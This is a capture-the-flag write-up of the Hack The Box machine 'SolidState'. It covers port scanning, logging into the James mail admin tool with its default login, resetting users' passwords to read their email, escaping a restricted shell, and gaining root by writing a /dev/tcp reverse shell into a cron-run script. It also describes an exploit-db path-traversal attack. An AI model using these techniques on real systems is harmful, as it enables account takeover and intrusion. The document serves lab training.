## Default Information
IP Address: 10.10.10.51\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.51    solidstate.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.51 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-04 13:10:12 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.51                                     
Discovered open port 80/tcp on 10.10.10.51                                     
Discovered open port 4555/tcp on 10.10.10.51                                   
Discovered open port 119/tcp on 10.10.10.51                                    
Discovered open port 110/tcp on 10.10.10.51                                    
Discovered open port 25/tcp on 10.10.10.51 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | Open |
| 25	| SMTP | JAMES smtpd 2.3.2 | Open |
| 80	| HTTP | Apache httpd 2.4.25 ((Debian)) | Open |
| 110	| POP3 | JAMES pop3 2.3.2 | Open |
| 119	| nntp | JAMES nntpd (posting ok) | Open |
| 4555	| NIL | NIL | Open |

For port 4555, even though we are unable to know the service for the port, but fingerprint-strings from nmap does reveal that this is a James Remote Adminstraton tool 2.3.2.
### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://solidstate.htb

```
http://10.10.10.51:80/LICENSE.txt          (Status: 200) [Size: 17128]
http://10.10.10.51:80/README.txt           (Status: 200) [Size: 963]
http://10.10.10.51:80/about.html           (Status: 200) [Size: 7183]
http://10.10.10.51:80/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
http://10.10.10.51:80/index.html           (Status: 200) [Size: 7776]
http://10.10.10.51:80/index.html           (Status: 200) [Size: 7776]
http://10.10.10.51:80/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
http://10.10.10.51:80/services.html        (Status: 200) [Size: 8404]
```

### Web-content discovery

Visiting http://solidstate.htb, the webpage does not provide much valuable information and we only find a form that for us to provide feedback. However, this form doesn't seem to be very exploitable as it only submits the form to the backend and we are unable to gain access to any admin interface.


## Exploit
### Testing SMTP server
From the nmap results earlier, we do know that we have a SMTP server on port 25. Now, let's try to connect to the SMPT server. However, we realize that the SMTP server only allows us to send/read emails and there is no potential areas of exploitation.

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sat, 4 Dec 2021 11:59:16 -0500 (EST)
HELO
501 Domain address required: HELO
HELO x
250 solidstate Hello x (10.10.16.4 [10.10.16.4])
EXPN root
502 5.3.3 EXPN is not supported
mail
501 5.5.4 Usage: MAIL FROM:<sender>
mail -f
501 5.5.4 Usage: MAIL FROM:<sender>
```
### Testing pop3 server
From the nmap results earlier, we also know that we have a POP3 server at port 110. However, we do realize that we would require the correct credentials to be able to authenticate into the POP3 server.

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER root
+OK
PASS root
-ERR Authentication failed.
USER admin
+OK
PASS admin
-ERR Authentication failed.
USER james
+OK
PASS james
-ERR Authentication failed.
```
### Testing James Authentication tool
Lastly, we recall that port 4555 is the James remote adminstration tool. Attempting to authenticate to port 4555 using the default credentials ```root:root``` worked.

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
```

Using the ```listusers``` command, we are able to find all the users that are registered on this server.

```
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Apart from that, we also realize that we are able to change the passwords of the users. We will then change all the passwords of the users into password123 so that we are able to authenticate into the pop3 server on port 110.

```
setpassword james password123
Password for james reset
setpassword thomas password123
Password for thomas reset
setpassword john password123
Password for john reset
setpassword mindy password123
Password for mindy reset
setpassword mailadmin password123
Password for mailadmin reset
```

Following that, we will login try to login to the users on port 110, which is the POP3 server. Going down the list of users, We realized that the user james and thomas do not contain any emails in the POP3 server, but the user john contains 1 email. We will then proceed to read the contents of the email using the RETR command.

Looking at the email content, we realize that there migh be some interesting email in mindy's account on the POP3 server, and also, Mindy might have restricted access to some of the servers.

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS password123
+OK Welcome john
stat
+OK 1 743
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

Next, we will now inspect Mindy's account on the POP3 server. Using the STAT command, we realize that Mindy has 2 emails on her account. Inspecting the email contents, we realize that the credentials of Mindy's SSH account is being exposed in the email.

```
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
USER mindy
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
PASS password123
+OK Welcome mindy
STAT
+OK 2 1945
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
### SSH Access to mindy's account
Knowing Mindy's SSH credentials, we will now try to gain SSH access to her account. However, we also realize that mindy's default shell is rbash instead of bash.
```
┌──(kali㉿kali)-[~]
└─$ ssh mindy@10.10.10.51               
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
```

Let us try to escape the rbash by using ```ssh mindy@10.10.10.51 -t "bash" ``` to SSH instead. We also realize that ```/``` is a forbidden character so /bin/bash is not going to work.

```
┌──(kali㉿kali)-[~]
└─$ ssh mindy@10.10.10.51 -t "bash"                                                                              1 ⨯
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
```
### Obtaining user flag
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
<Redacted user flag>
```

### Privilege Escalation to root

Using linpeas, we realize that there is a background process that is running is being executed with root permissions, in the /opt directory.

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps -aux | grep run.sh
root       516  0.0  0.0   2332   620 ?        Ss   22:34   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
```

Now, we will use [pspy](https://github.com/DominicBreuker/pspy) to investigate the background processes. From here, we notice that there is a /opt/tmp.py being executed in the background as well.

```
2021/12/04 23:31:59 CMD: UID=1001 PID=17693  | rbash -c bash 
2021/12/04 23:32:17 CMD: UID=???  PID=17694  | ???
2021/12/04 23:33:01 CMD: UID=0    PID=17697  | /usr/sbin/CRON -f 
2021/12/04 23:33:01 CMD: UID=0    PID=17699  | python /opt/tmp.py 
2021/12/04 23:33:01 CMD: UID=0    PID=17698  | /bin/sh -c python /opt/tmp.py 
2021/12/04 23:33:01 CMD: UID=0    PID=17700  | sh -c rm -r /tmp/*  
2021/12/04 23:33:01 CMD: UID=0    PID=17701  | rm -r /tmp/* 
```

Investigating /opt/tmp.py, we realized that this script is removing all the files in the tmp directory, which explains the ```rm -r /tmp/*``` running in the background process after /opt/tmp.py was executed.

```
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

Looking at the permissions of the tmp.py script, we realize that we are able to write into the file. This means that we can write a reverse shell command into the script and execute it when the script is executed in the background

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/4000 0>&1'")
```

After a while, when the tmp.py is being executed in the background, the reverse shell will be spawned.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 47824
bash: cannot set terminal process group (1028): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### Obtaining root flag

```
root@solidstate:~# cat root.txt
cat root.txt
<Redacted root flag>
```

## Post-Exploitation
### Remote command execution on James Adminstration tool

Using the vulnerability described on exploitdb [here](https://www.exploit-db.com/exploits/35513), we are also able to create a reverse shell and gain access to mindy's account. 

This exploit primarily works by first gaining access to the James Adminstration tool using the default username and password and creating a new user ```../../../../../../../../etc/bash_completion.d exploit```.
```
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```
Afterwards, we will then gain access to the SMTP server which is port 25 by default on this machine. We will then send an email with the rcpt fields being ```rcpt to: <../../../../../../../../etc/bash_completion.d>```. As such, the email will then be sent to everyone and anyone with SSH access that logs in with trigger the reverse shell.

However, one good thing about the reverse shell that is being generated is that this reverse shell is not a limited shell, but instead it has the capabilities of a bash shell and not that of the rbash

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 44106
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
whoami
mindy
```
